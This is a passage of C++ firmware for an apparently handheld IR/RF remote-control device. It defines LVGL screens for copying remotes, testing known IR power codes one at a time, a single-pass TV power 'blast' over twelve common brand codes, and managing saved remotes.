  create_button(ir_copy_category_screen, 25, 332, 270, 36, "OPEN SAVED REMOTES", COLOR_SAVED, open_saved);
  create_button(ir_copy_category_screen, 70, 390, 180, 32, "BACK TO IR TOOLS", COLOR_IR, open_ir);
  create_footer(ir_copy_category_screen);
}


void create_ir_guided_copy_screen() {
  ir_guided_copy_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_guided_copy_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_guided_copy_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_guided_copy_screen, "GUIDED IR COPY");

  ir_guided_progress_label = lv_label_create(ir_guided_copy_screen);
  lv_obj_set_style_text_color(ir_guided_progress_label, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_guided_progress_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(ir_guided_progress_label, LV_ALIGN_TOP_RIGHT, -25, 80);

  ir_guided_instruction_label = lv_label_create(ir_guided_copy_screen);
  lv_obj_set_style_text_color(ir_guided_instruction_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_guided_instruction_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_set_style_text_align(ir_guided_instruction_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(ir_guided_instruction_label, LV_ALIGN_TOP_MID, 0, 150);

  ir_guided_learn_button = create_button(ir_guided_copy_screen, 45, 276, 230, 48,
                                          "LEARN THIS BUTTON", COLOR_GREEN, begin_guided_ir_step);
  ir_guided_skip_button = create_button(ir_guided_copy_screen, 70, 332, 180, 38,
                                         "SKIP THIS BUTTON", COLOR_MUTED, skip_guided_ir_step);
  ir_guided_finish_button = create_button(ir_guided_copy_screen, 45, 276, 230, 48,
                                           "NAME + SAVE REMOTE", COLOR_GREEN, finish_guided_ir_copy);
  create_button(ir_guided_copy_screen, 70, 386, 180, 32, "CANCEL", COLOR_RED, open_ir_copy_category);
  create_footer(ir_guided_copy_screen);
}


const char *ir_discovery_candidate_name() {
  if (strcmp(ir_discovery_device_name, "PROJECTOR") == 0) {
    switch (ir_discovery_candidate_index) {
      case 0: return "PROJECTOR NEC PROFILE A";
      case 1: return "PROJECTOR NEC PROFILE B";
      case 2: return "PROJECTOR NEC PROFILE C";
      case 3: return "PROJECTOR NEC PROFILE D";
      case 4: return "PROJECTOR NEC PROFILE E";
      case 5: return "PROJECTOR NEC PROFILE F";
      case 6: return "PROJECTOR NEC PROFILE G";
      case 7: return "PROJECTOR NEC PROFILE H";
      case 8: return "PROJECTOR NEC PROFILE I";
      default: return "NO MORE TESTS";
    }
  }

  if (strcmp(ir_discovery_device_name, "LIGHT") == 0) {
    return ir_discovery_candidate_index == 0 ? "RGB LIGHT ON" : "NO MORE TESTS";
  }

  switch (ir_discovery_candidate_index) {
    case 0: return "NEC TV POWER A";
    case 1: return "SAMSUNG-STYLE POWER";
    case 2: return "SONY-STYLE POWER";
    case 3: return "NEC TV POWER B";
    case 4: return "NEC TV POWER C";
    case 5: return "NEC TV POWER D";
    case 6: return "NEC TV POWER E";
    case 7: return "NEC TV POWER F";
    case 8: return "LG TV POWER";
    case 9: return "JVC TV POWER";
    case 10: return "TOSHIBA TV POWER A";
    case 11: return "TOSHIBA TV POWER B";
    default: return "NO MORE TESTS";
  }
}


uint8_t ir_discovery_candidate_count() {
  if (strcmp(ir_discovery_device_name, "PROJECTOR") == 0) return 9;
  if (strcmp(ir_discovery_device_name, "LIGHT") == 0) return 1;
  // Most ceiling-fan handheld remotes use RF rather than IR. Do not send
  // unrelated TV commands while the user is in the Fan category.
  if (strcmp(ir_discovery_device_name, "FAN") == 0) return 0;
  return 12;
}


void fill_ir_discovery_anchor(SavedIrRemoteCommand &command) {
  memset(&command, 0, sizeof(command));
  command.valid = 1;

  if (strcmp(ir_discovery_device_name, "PROJECTOR") == 0) {
    command.protocol = NEC;
    command.bits = 32;
    if (ir_discovery_candidate_index == 0) {
      command.address = 0xF483;
      command.command = 0xB04F;
    } else if (ir_discovery_candidate_index == 1) {
      command.address = 0x1980;
      command.command = 0xEF10;
    } else if (ir_discovery_candidate_index == 2) {
      command.address = 0x4040;
      command.command = 0xF50A;
    } else if (ir_discovery_candidate_index == 3) {
      command.address = 0x08;
      command.command = 0x14;
    } else if (ir_discovery_candidate_index == 4) {
      command.address = 0x08;
      command.command = 0x0B;
    } else if (ir_discovery_candidate_index == 5) {
      command.address = 0x02;
      command.command = 0x1D;
    } else if (ir_discovery_candidate_index == 6) {
      command.address = 0x31;
      command.command = 0x91;
    } else if (ir_discovery_candidate_index == 7) {
      command.address = 0x03;
      command.command = 0x1D;
    } else {
      command.address = 0x01;
      command.command = 0x00;
    }
    return;
  }

  if (strcmp(ir_discovery_device_name, "LIGHT") == 0) {
    // Common RGB "Magic Lighting" remotes use this NEC ON command.
    command.protocol = NEC;
    command.address = 0x0;
    command.command = 0x07;
    command.bits = 32;
    return;
  }

  if (ir_discovery_candidate_index == 0) {
    // The known NEC power send path already works with the current hardware.
    command.protocol = NEC;
    command.address = 0x4;
    command.command = 0x8;
    command.bits = 32;
    command.raw_data = 0xF708FB04ULL;
  } else if (ir_discovery_candidate_index == 1) {
    command.protocol = SAMSUNG;
    command.bits = 32;
    command.raw_data = 0xE0E040BFUL;
    command.flags = IR_DISCOVERY_FLAG_SAMSUNG_MSB;
  } else if (ir_discovery_candidate_index == 2) {
    command.protocol = SONY;
    command.address = 0x15;
    command.command = 0x10;
    command.extra = SIRCS_12_PROTOCOL;
    command.bits = SIRCS_12_PROTOCOL;
    command.raw_data = ((uint64_t)command.address << 7) | command.command;
    command.flags = IR_DISCOVERY_FLAG_SONY;
  } else if (ir_discovery_candidate_index == 8) {
    // LG 20DF10EF Power, stored in the byte order used by send_nec_rmt().
    command.protocol = NEC;
    command.bits = 32;
    command.raw_data = 0xEF10DF20UL;
  } else if (ir_discovery_candidate_index == 9) {
    command.protocol = JVC;
    command.bits = 16;
    command.raw_data = 0xC5E8;
  } else if (ir_discovery_candidate_index == 10) {
    command.protocol = NEC;
    command.address = 0x02;
    command.command = 0x48;
    command.bits = 32;
  } else if (ir_discovery_candidate_index == 11) {
    command.protocol = NEC;
    command.address = 0x02;
    command.command = 0xD0;
    command.bits = 32;
  } else {
    command.protocol = NEC;
    command.bits = 32;
    switch (ir_discovery_candidate_index) {
      case 3:
        command.address = 0x18;
        command.command = 0x08;
        break;
      case 4:
        command.address = 0x71;
        command.command = 0x08;
        break;
      case 5:
        command.address = 0x48;
        command.command = 0x00;
        break;
      case 6:
        command.address = 0x50;
        command.command = 0x08;
        break;
      default:
        command.address = 0x00;
        command.command = 0x01;
        break;
    }
  }
}


bool transmit_ir_discovery_candidate() {
  if (!ir_transmitter_ready || ir_discovery_candidate_index >= ir_discovery_candidate_count()) return false;

  SavedIrRemoteCommand candidate = {};
  fill_ir_discovery_anchor(candidate);
  if (!send_saved_ir_command(candidate)) return false;
  Serial.printf("IR discovery sent %s for %s\n",
                ir_discovery_candidate_name(), ir_discovery_device_name);
  return true;
}


void refresh_ir_discovery_screen() {
  if (ir_discovery_label == NULL) return;

  const uint8_t candidate_count = ir_discovery_candidate_count();
  if (candidate_count == 0) {
    lv_label_set_text(ir_discovery_label,
                      "FAN DISCOVERY\n\nMost ceiling-fan remotes use RF,\nnot IR. Use RF Discovery from\nthe RF tools section instead.");
    lv_obj_add_flag(ir_discovery_send_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_discovery_worked_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_discovery_next_button, LV_OBJ_FLAG_HIDDEN);
    return;
  }

  if (ir_discovery_candidate_index >= candidate_count) {
    lv_label_set_text_fmt(ir_discovery_label,
                          "%s DISCOVERY\n\nNo match from this small\nprofile set. Try another\ncategory or use Copy Remote.",
                          ir_discovery_device_name);
    lv_obj_add_flag(ir_discovery_send_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_discovery_worked_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_discovery_next_button, LV_OBJ_FLAG_HIDDEN);
    return;
  }

  lv_label_set_text_fmt(ir_discovery_label,
                        "%s DISCOVERY\n\nTEST %d / %d\n%s\n\nPoint at your own device, then\nsend this single test and report\nthe result.%s",
                        ir_discovery_device_name,
                        ir_discovery_candidate_index + 1,
                        candidate_count,
                        ir_discovery_candidate_name(),
                        ir_discovery_candidate_sent ? "\n\nDid it respond?" : "");
  lv_obj_clear_flag(ir_discovery_send_button, LV_OBJ_FLAG_HIDDEN);
  if (ir_discovery_candidate_sent) {
    lv_obj_clear_flag(ir_discovery_worked_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_clear_flag(ir_discovery_next_button, LV_OBJ_FLAG_HIDDEN);
  } else {
    lv_obj_add_flag(ir_discovery_worked_button, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ir_discovery_next_button, LV_OBJ_FLAG_HIDDEN);
  }
}


void start_ir_discovery(const char *device_name) {
  ir_discovery_device_name = device_name;
  ir_discovery_candidate_index = 0;
  ir_discovery_candidate_sent = false;
  if (ir_discovery_screen == NULL) create_ir_discovery_screen();
  refresh_ir_discovery_screen();
  lv_scr_load(ir_discovery_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void start_ir_discovery_tv(lv_event_t *e) { start_ir_discovery("TV"); }
void start_ir_discovery_projector(lv_event_t *e) { start_ir_discovery("PROJECTOR"); }
void start_ir_discovery_light(lv_event_t *e) { start_ir_discovery("LIGHT"); }
void start_ir_discovery_fan(lv_event_t *e) { start_ir_discovery("FAN"); }
void start_ir_discovery_other(lv_event_t *e) { start_ir_discovery("OTHER"); }


void send_ir_discovery_candidate(lv_event_t *e) {
  if (!transmit_ir_discovery_candidate()) {
    set_status("IR TX MODULE REQUIRED", COLOR_RED);
    return;
  }
  ir_discovery_candidate_sent = true;
  refresh_ir_discovery_screen();
  set_status("TRANSMITTING", COLOR_IR);
}


void ir_discovery_next(lv_event_t *e) {
  if (!ir_discovery_candidate_sent) return;
  ir_discovery_candidate_index++;
  ir_discovery_candidate_sent = false;
  refresh_ir_discovery_screen();
  set_status("SYSTEM READY", COLOR_READY);
}


void ir_discovery_worked(lv_event_t *e) {
  if (!ir_discovery_candidate_sent || saved_ir_remote_count >= MAX_IR_SAVED_REMOTES) {
    set_status(saved_ir_remote_count >= MAX_IR_SAVED_REMOTES ? "SAVED IR REMOTES FULL" : "SEND A TEST FIRST", COLOR_RED);
    return;
  }

  memset(&ir_working_remote, 0, sizeof(ir_working_remote));
  ir_working_remote.magic = SAVED_IR_REMOTE_MAGIC;
  snprintf(ir_working_remote.name, sizeof(ir_working_remote.name), "%s DISCOVERY", ir_discovery_device_name);
  ir_working_remote.button_count = 1;
  strncpy(ir_working_remote.button_names[0], "POWER",
          sizeof(ir_working_remote.button_names[0]) - 1);
  fill_ir_discovery_anchor(ir_working_remote.buttons[0]);
  ir_working_remote_from_save = false;
  ir_guided_copy_active = false;
  ir_name_saves_guided_copy = false;
  ir_name_saves_discovery_anchor = true;

  if (ir_remote_name_screen == NULL) create_ir_remote_name_screen();
  lv_textarea_set_text(ir_remote_name_textarea, ir_working_remote.name);
  lv_scr_load(ir_remote_name_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void create_ir_discovery_category_screen() {
  ir_discovery_category_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_discovery_category_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_discovery_category_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_discovery_category_screen, "IR DISCOVERY");

  lv_obj_t *info = lv_label_create(ir_discovery_category_screen);
  lv_label_set_text(info,
                    "For devices without their remote.\nEach test is sent once; report\nwhether your own device responds.");
  lv_obj_set_style_text_color(info, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(info, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 108);

  create_button(ir_discovery_category_screen, 25, 165, 130, 46, "TV", COLOR_IR, start_ir_discovery_tv);
  create_button(ir_discovery_category_screen, 165, 165, 130, 46, "PROJECTOR", COLOR_SETTINGS, start_ir_discovery_projector);
  create_button(ir_discovery_category_screen, 25, 221, 130, 46, "LIGHT", COLOR_GREEN, start_ir_discovery_light);
  create_button(ir_discovery_category_screen, 165, 221, 130, 46, "FAN", COLOR_RF, start_ir_discovery_fan);
  create_button(ir_discovery_category_screen, 25, 277, 270, 40, "OTHER / UNKNOWN", COLOR_MUTED, start_ir_discovery_other);
  create_button(ir_discovery_category_screen, 70, 385, 180, 32, "BACK TO IR TOOLS", COLOR_IR, open_ir);
  create_footer(ir_discovery_category_screen);
}


void create_ir_discovery_screen() {
  ir_discovery_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_discovery_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_discovery_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_header(ir_discovery_screen, "IR DISCOVERY");

  ir_discovery_label = lv_label_create(ir_discovery_screen);
  lv_obj_set_style_text_color(ir_discovery_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_discovery_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(ir_discovery_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(ir_discovery_label, LV_ALIGN_TOP_MID, 0, 105);

  ir_discovery_send_button = create_button(ir_discovery_screen, 45, 280, 230, 42,
                                            "SEND TEST SIGNAL", COLOR_IR, send_ir_discovery_candidate);
  ir_discovery_worked_button = create_button(ir_discovery_screen, 25, 332, 130, 40,
                                              "WORKED", COLOR_GREEN, ir_discovery_worked);
  ir_discovery_next_button = create_button(ir_discovery_screen, 165, 332, 130, 40,
                                            "NO RESPONSE", COLOR_SETTINGS, ir_discovery_next);
  create_button(ir_discovery_screen, 70, 385, 180, 32, "CHANGE DEVICE", COLOR_IR, open_ir_discovery);
  create_footer(ir_discovery_screen);
  refresh_ir_discovery_screen();
}


void refresh_ir_blast_screen() {
  if (ir_blast_label == NULL) {
    return;
  }

  if (ir_receiver_test_active) {
    lv_label_set_text(
      ir_blast_label,
      ir_power_learn_active ?
        "LEARNING TV POWER...\n\nPoint your TV remote at the\nreceiver and press Power." :
        "LISTENING FOR IR...\n\nPoint an IR remote at the\nreceiver and press a button."
    );
    return;
  }

  const char *receiver_result =
    ir_receiver_test_result == 2 ? "\n\nTV Power code: SAVED" :
    ir_receiver_test_result == 1 ? "\n\nIR receiver: SIGNAL DETECTED" :
    ir_receiver_test_result == 0 ? "\n\nIR receiver: no signal detected" : "";
  lv_label_set_text_fmt(
    ir_blast_label,
    "ONE-PASS POWER BLAST\n\nSends 12 built-in TV Power\nprofiles including NEC, Samsung,\nSony, LG, JVC, and Toshiba.\n\nDoes not use Saved Remotes.\nUse only around TVs you own.%s",
    receiver_result
  );
}


void ir_tv_next_candidate(lv_event_t *e) {
  ir_tv_candidate_index = (ir_tv_candidate_index + 1) % IR_TV_CANDIDATE_COUNT;
  refresh_ir_blast_screen();
  set_status("NEXT TV CODE READY", COLOR_IR);
}


uint8_t ir_tv_blast_step_count() {
  // Six NEC profiles plus Samsung, Sony, LG, JVC, and two Toshiba profiles.
  // This catalog deliberately never
  // reads from Saved Remotes; the blast is its own built-in feature.
  return 12;
}


void show_ir_blast_transmit_step(uint8_t step, uint8_t total, const char *profile) {
  if (ir_blast_transmit_screen == NULL) create_ir_blast_transmit_screen();

  // Keep the transmit display deliberately visual: the center only shows the
  // profile currently being emitted and its place in the single pass.
  lv_label_set_text_fmt(ir_blast_transmit_title, "%s\n%u/%u", profile, step, total);

  // Advance the three bright rings for a visual "signal leaving the remote"
  // effect.  The screen is explicitly refreshed before the next IR command.
  const uint16_t ring_sizes[] = {82, 142, 202};
  const uint32_t ring_colors[] = {COLOR_IR, 0xFF7A3D, COLOR_MUTED};
  uint8_t active_ring = (step - 1) % 3;
  for (uint8_t i = 0; i < 3; i++) {
    lv_obj_t *ring = ir_blast_transmit_rings[i];
    if (ring == NULL) continue;
    uint8_t rotated = (i + active_ring) % 3;
    lv_obj_set_size(ring, ring_sizes[rotated], ring_sizes[rotated]);
    lv_obj_set_style_border_color(ring, lv_color_hex(ring_colors[rotated]), LV_PART_MAIN);
    lv_obj_set_style_border_opa(ring, i == 0 ? LV_OPA_COVER : LV_OPA_70, LV_PART_MAIN);
    lv_obj_center(ring);
  }
  lv_refr_now(NULL);
}


void show_ir_blast_complete(uint8_t total) {
  if (ir_blast_transmit_screen == NULL) return;
  (void)total;
  lv_label_set_text(ir_blast_transmit_title, "DONE");
  for (uint8_t i = 0; i < 3; i++) {
    if (ir_blast_transmit_rings[i] != NULL) {
      lv_obj_set_style_border_color(ir_blast_transmit_rings[i], lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
      lv_obj_set_style_border_opa(ir_blast_transmit_rings[i], LV_OPA_COVER, LV_PART_MAIN);
    }
  }
  lv_refr_now(NULL);
}


void ir_tv_power_blast(lv_event_t *e) {
  (void)e;
  if (!ir_transmitter_ready) {
    set_status("IR TX MODULE REQUIRED", COLOR_RED);
    return;
  }

  // This is intentionally one controlled pass, not an endless broadcast.
  // Every entry is a Power-only reference profile for TVs the user owns.
  const uint8_t total_steps = ir_tv_blast_step_count();
  uint8_t step = 0;
  if (ir_blast_transmit_screen == NULL) create_ir_blast_transmit_screen();
  lv_scr_load(ir_blast_transmit_screen);
  set_status("TRANSMITTING", COLOR_IR);
  lv_refr_now(NULL);

  // Common NEC power profiles from the open Flipper TV catalog.  They cover
  // several unrelated NEC-family TV remotes while keeping the blast bounded.
  const uint8_t nec_addresses[] = {0x04, 0x18, 0x71, 0x48, 0x50, 0x00};
  const uint8_t nec_commands[]  = {0x08, 0x08, 0x08, 0x00, 0x08, 0x01};
  for (uint8_t i = 0; i < sizeof(nec_addresses); i++) {
    SavedIrRemoteCommand nec = {};
    nec.valid = 1;
    nec.protocol = NEC;
    nec.address = nec_addresses[i];
    nec.command = nec_commands[i];
    nec.bits = 32;
    char profile_label[28];
    snprintf(profile_label, sizeof(profile_label), "NEC %02u", i + 1);
    show_ir_blast_transmit_step(++step, total_steps, profile_label);
    delay(75);
    if (send_saved_ir_command(nec)) {
      Serial.printf("TV blast sent NEC Power %u/%u\n", nec.address, nec.command);
    }
    delay(180);
  }

  // Widely used reference Power commands: Samsung 32-bit and Sony SIRC-12.
  SavedIrRemoteCommand samsung = {};
  samsung.valid = 1;
  samsung.protocol = SAMSUNG;
  samsung.bits = 32;
  samsung.raw_data = 0xE0E040BFUL;
  show_ir_blast_transmit_step(++step, total_steps, "SAMSUNG");
  delay(75);
  send_saved_ir_command(samsung);
  Serial.println("TV blast sent Samsung Power");
  delay(180);
  SavedIrRemoteCommand sony = {};
  sony.valid = 1;
  sony.protocol = SONY;
  sony.bits = SIRCS_12_PROTOCOL;
  sony.raw_data = ((uint64_t)0x15 << 7) | 0x10;
  show_ir_blast_transmit_step(++step, total_steps, "SONY");
  delay(75);
  send_saved_ir_command(sony);
  Serial.println("TV blast sent Sony Power");
  delay(180);

  SavedIrRemoteCommand lg = {};
  lg.valid = 1;
  lg.protocol = NEC;
  lg.bits = 32;
  lg.raw_data = 0xEF10DF20UL;
  show_ir_blast_transmit_step(++step, total_steps, "LG");
  delay(75);
  send_saved_ir_command(lg);
  Serial.println("TV blast sent LG Power");
  delay(180);

  SavedIrRemoteCommand jvc = {};
  jvc.valid = 1;
  jvc.protocol = JVC;
  jvc.bits = 16;
  jvc.raw_data = 0xC5E8;
  show_ir_blast_transmit_step(++step, total_steps, "JVC");
  delay(75);
  send_saved_ir_command(jvc);
  Serial.println("TV blast sent JVC Power");
  delay(180);

  const uint8_t toshiba_commands[] = {0x48, 0xD0};
  for (uint8_t i = 0; i < 2; i++) {
    SavedIrRemoteCommand toshiba = {};
    toshiba.valid = 1;
    toshiba.protocol = NEC;
    toshiba.address = 0x02;
    toshiba.command = toshiba_commands[i];
    toshiba.bits = 32;
    char profile_label[20];
    snprintf(profile_label, sizeof(profile_label), "TOSHIBA %c", 'A' + i);
    show_ir_blast_transmit_step(++step, total_steps, profile_label);
    delay(75);
    send_saved_ir_command(toshiba);
    Serial.printf("TV blast sent Toshiba Power %c\n", 'A' + i);
    delay(180);
  }

  show_ir_blast_complete(total_steps);
  delay(550);
  refresh_ir_blast_screen();
  lv_scr_load(ir_blast_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void ir_receiver_check(lv_event_t *e) {
  if (!ir_receiver_ready) {
    Serial.println("IR receiver is not initialized");
    return;
  }

  ir_receiver_test_active = true;
  ir_power_learn_active = false;
  ir_remote_learn_active = false;
  ir_receiver_test_started_ms = millis();
  ir_receiver_test_result = -1;
  refresh_ir_blast_screen();
  set_status("LISTENING", COLOR_IR);
  Serial.println("IR receiver test: decoding for 5 seconds");
}


void ir_learn_tv_power(lv_event_t *e) {
  if (!ir_receiver_ready) {
    Serial.println("IR receiver is not initialized");
    return;
  }

  ir_receiver_test_active = true;
  ir_power_learn_active = true;
  ir_remote_learn_active = false;
  ir_receiver_test_started_ms = millis();
  ir_receiver_test_result = -1;
  refresh_ir_blast_screen();
  set_status("LISTENING", COLOR_IR);
  Serial.println("IR learn: press the TV remote Power button within 5 seconds");
}


void create_ir_blast_transmit_screen() {
  ir_blast_transmit_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_blast_transmit_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_blast_transmit_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(ir_blast_transmit_screen, false);
  create_header(ir_blast_transmit_screen, "");

  // Build the outer rings first so the smaller rings stay visible as the
  // signal animation advances through each power profile.
  const uint16_t ring_sizes[] = {202, 142, 82};
  for (uint8_t i = 0; i < 3; i++) {
    ir_blast_transmit_rings[i] = lv_obj_create(ir_blast_transmit_screen);
    lv_obj_set_size(ir_blast_transmit_rings[i], ring_sizes[i], ring_sizes[i]);
    lv_obj_center(ir_blast_transmit_rings[i]);
    lv_obj_set_style_bg_opa(ir_blast_transmit_rings[i], LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(ir_blast_transmit_rings[i], 2, LV_PART_MAIN);
    lv_obj_set_style_border_color(ir_blast_transmit_rings[i], lv_color_hex(COLOR_IR), LV_PART_MAIN);
    lv_obj_set_style_border_opa(ir_blast_transmit_rings[i], i == 2 ? LV_OPA_COVER : LV_OPA_70, LV_PART_MAIN);
    lv_obj_set_style_radius(ir_blast_transmit_rings[i], LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_clear_flag(ir_blast_transmit_rings[i], LV_OBJ_FLAG_SCROLLABLE);
  }

  lv_obj_t *tv_core = lv_obj_create(ir_blast_transmit_screen);
  lv_obj_set_size(tv_core, 124, 76);
  lv_obj_center(tv_core);
  lv_obj_set_style_bg_color(tv_core, lv_color_hex(COLOR_PANEL2), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(tv_core, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_border_color(tv_core, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_border_width(tv_core, 2, LV_PART_MAIN);
  lv_obj_set_style_radius(tv_core, 7, LV_PART_MAIN);
  lv_obj_clear_flag(tv_core, LV_OBJ_FLAG_SCROLLABLE);

  ir_blast_transmit_title = lv_label_create(tv_core);
  lv_obj_set_width(ir_blast_transmit_title, 116);
  lv_label_set_text(ir_blast_transmit_title, "READY");
  lv_obj_set_style_text_color(ir_blast_transmit_title, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(ir_blast_transmit_title, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(ir_blast_transmit_title, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_center(ir_blast_transmit_title);
}


void create_ir_blast_screen() {
  ir_blast_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_blast_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_blast_screen, LV_OPA_COVER, LV_PART_MAIN);

  create_cyber_background(ir_blast_screen, false);
  create_header(ir_blast_screen, "TV POWER BLAST");

  // A single clean Power control: no burst rays, inset stripes, or other
  // decoration competing with the main action.
  lv_obj_t *blast_button = lv_btn_create(ir_blast_screen);
  lv_obj_set_pos(blast_button, 60, 205);
  lv_obj_set_size(blast_button, 200, 82);
  lv_obj_set_style_bg_color(blast_button, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(blast_button, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_border_color(blast_button, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_radius(blast_button, 16, LV_PART_MAIN);
  lv_obj_set_style_border_width(blast_button, 2, LV_PART_MAIN);
  lv_obj_set_style_shadow_color(blast_button, lv_color_hex(COLOR_IR), LV_PART_MAIN);
  lv_obj_set_style_shadow_width(blast_button, 8, LV_PART_MAIN);
  lv_obj_set_style_shadow_opa(blast_button, LV_OPA_30, LV_PART_MAIN);
  lv_obj_add_event_cb(blast_button, ir_tv_power_blast, LV_EVENT_CLICKED, NULL);

  lv_obj_t *power_label = lv_label_create(blast_button);
  lv_label_set_text(power_label, "POWER");
  lv_obj_set_style_text_color(power_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(power_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_center(power_label);

  // A small symbol-only exit preserves navigation without adding page copy.
  lv_obj_t *back_button = create_button(ir_blast_screen, 12, 402, 42, 32, "<", COLOR_IR, open_ir);
  lv_obj_set_style_radius(back_button, LV_RADIUS_CIRCLE, LV_PART_MAIN);
}


void create_ir_screen() {
  ir_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(ir_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(ir_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(ir_screen, false);
  create_header(ir_screen, "IR TOOLS");

  create_home_card(ir_screen, 22, 110, 276, 76, "+", "COPY REMOTE", "GUIDED LEARN", COLOR_IR, open_ir_copy_category);
  create_home_card(ir_screen, 22, 200, 276, 76, ">", "IR DISCOVERY", "TEST KNOWN SIGNALS", COLOR_SETTINGS, open_ir_discovery);
  create_home_card(ir_screen, 22, 290, 276, 76, "!", "TV POWER BLAST", "POPULAR TV POWER", COLOR_IR, open_ir_blast);
  create_button(ir_screen, 70, 395, 180, 32, "HOME", COLOR_IR, go_home);
  create_footer(ir_screen);
}

void create_saved_screen() {
  saved_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(saved_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(saved_screen, LV_OPA_COVER, LV_PART_MAIN);

  create_cyber_background(saved_screen, false);

  create_header(saved_screen, "SAVED REMOTES");

  saved_summary_label = lv_label_create(saved_screen);
  lv_obj_set_style_text_color(saved_summary_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(saved_summary_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(saved_summary_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(saved_summary_label, LV_ALIGN_CENTER, 0, -55);

  create_button(saved_screen, 55, 250, 210, 32, "NEXT SAVED REMOTE", COLOR_RF, select_next_saved_remote);
  create_button(saved_screen, 55, 288, 210, 32, "OPEN SELECTED", COLOR_GREEN, open_latest_saved_remote);
  create_button(saved_screen, 70, 325, 180, 32, "DELETE LAST REMOTE", COLOR_RED, delete_latest_saved_remote);
  create_button(saved_screen, 35, 365, 115, 40, "SAVED MENU", COLOR_SAVED, open_saved);
  create_button(saved_screen, 170, 365, 115, 40, "HOME", COLOR_SAVED, go_home);
  create_footer(saved_screen);
  refresh_saved_summary();
}


void open_rf_saved_collection(lv_event_t *e) {
  refresh_saved_summary();
  lv_scr_load(saved_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void open_saved_hub_tile(lv_event_t *e) {
  // LVGL emits CLICKED when a long press is released too. Consume that one
  // click so the delete confirmation remains on screen.
  if (saved_hub_ignore_release_click) {
    saved_hub_ignore_release_click = false;
    return;
  }
  uint8_t tile_index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (tile_index < saved_remote_count) {
    selected_saved_index = tile_index;
    open_latest_saved_remote(e);
    return;
  }

  uint8_t ir_index = tile_index - saved_remote_count;
  if (ir_index < saved_ir_remote_count) {
    selected_ir_saved_index = ir_index;
    open_selected_ir_remote(e);
  }
}


void request_saved_hub_delete(lv_event_t *e) {
  uint8_t tile_index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  const char *remote_name = NULL;

  if (tile_index < saved_remote_count) {
    saved_delete_pending_is_ir = false;
    saved_delete_pending_index = tile_index;
    remote_name = saved_remotes[tile_index].name;
  } else {
    uint8_t ir_index = tile_index - saved_remote_count;
    if (ir_index >= saved_ir_remote_count) return;
    saved_delete_pending_is_ir = true;
    saved_delete_pending_index = ir_index;
